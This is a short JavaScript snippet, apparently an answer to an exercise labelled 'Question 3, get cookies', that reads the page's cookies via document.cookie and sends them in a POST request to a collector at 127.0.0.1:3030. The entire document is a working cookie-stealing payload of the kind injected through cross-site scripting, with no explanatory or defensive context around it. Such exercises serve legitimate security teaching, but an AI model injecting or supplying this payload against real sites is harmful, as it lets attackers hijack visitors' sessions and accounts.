// Question 3, get cookies



cookies = document.cookie.split(); console.log(cookies)
fetch('http://127.0.0.1:3030', {
    method: 'POST',
    headers: {
      'Accept': 'application/json',
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({"cookies": cookies})
});
